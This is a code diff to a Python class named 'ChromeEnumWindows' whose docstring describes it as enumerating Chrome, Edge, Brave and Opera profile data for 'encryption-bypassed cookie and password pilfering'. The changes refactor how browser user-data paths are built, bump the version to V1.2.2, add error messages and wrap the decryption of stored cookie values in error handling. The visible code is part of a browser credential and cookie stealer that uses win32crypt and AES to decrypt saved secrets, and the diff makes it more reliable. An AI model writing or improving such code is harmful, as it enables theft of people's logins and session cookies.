@@ -132,6 +132,7 @@ import shutil
 import sqlite3
 import string
 import sys
+import argparse
 from platform import system
 
 import win32crypt
@@ -140,10 +141,10 @@ from Cryptodome.Cipher import AES
 
 class ChromeEnumWindows:
     """Enumerates Chrome-based browser data to allow for encryption-bypassed cookie and password pilfering"""
-    CHROME_DIRS = [os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\'),
-                   os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\'),
-                   os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\'),
-                   os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable\\')]
+    CHROME_DIRS = ['AppData\\Local\\Google\\Chrome\\User Data\\',
+                   'AppData\\Local\\Microsoft\\Edge\\User Data\\',
+                   'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\',
+                   'AppData\\Roaming\\Opera Software\\Opera Stable\\']
     COOKIES_DIRS = ['Network\\Cookies',
                     'Default\\Cookies',
                     'Default\\Network\\Cookies']
@@ -152,22 +153,29 @@ class ChromeEnumWindows:
 
     def __init__(self):
         self.name = 'Chrome Enum for Windows'
-        self.version = 'V1.2.1'
+        self.version = 'V1.2.2'
+        user_data_paths = []
         if system() != "Windows":
             raise NotImplementedError(system() + " is not supported in this class.")
-        base_dir_list: list = self.__get_base_dir()
+
+        for chrome_dir in self.CHROME_DIRS:
+            user_data_paths.append(os.path.expanduser('~\\' + chrome_dir))
+
+        base_dir_list: list = self.__get_base_dir(user_data_paths)
         self.dir_and_key = {}
         for base_dir in base_dir_list:
             self.dir_and_key[base_dir] = self.__key_extract(base_dir)
 
-    def __get_base_dir(self) -> list:
+    @staticmethod
+    def __get_base_dir(user_data_paths) -> list:
         base_dir = []
-        for possible_path in self.CHROME_DIRS:
+        for possible_path in user_data_paths:
             if os.path.exists(possible_path):
                 base_dir.append(possible_path)
 
         if not base_dir:
-            raise FileNotFoundError('Unable to find Chrome\'s "User Data" directory.')
+            raise FileNotFoundError('Unable to find Chrome\'s "User Data" directory. Paths attempted: '
+                                    + str(user_data_paths))
         return base_dir
 
     @staticmethod
@@ -321,7 +329,11 @@ class ChromeEnumWindows:
         columns = [fields[0] for fields in cursor.description]
         for row in cursor.fetchall():
             row = list(row)
-            row[columns.index("encrypted_value")] = self.__decrypter(row[columns.index("encrypted_value")], key)
+            try:
+                row[columns.index("encrypted_value")] = self.__decrypter(row[columns.index("encrypted_value")], key)
+            except ValueError:
+                print("Decryption type unknown. File attempted to decrypt: " + database_file +
+                      ". Please report this error", )
             decrypted_database.append(row)
         database.close()
         try:
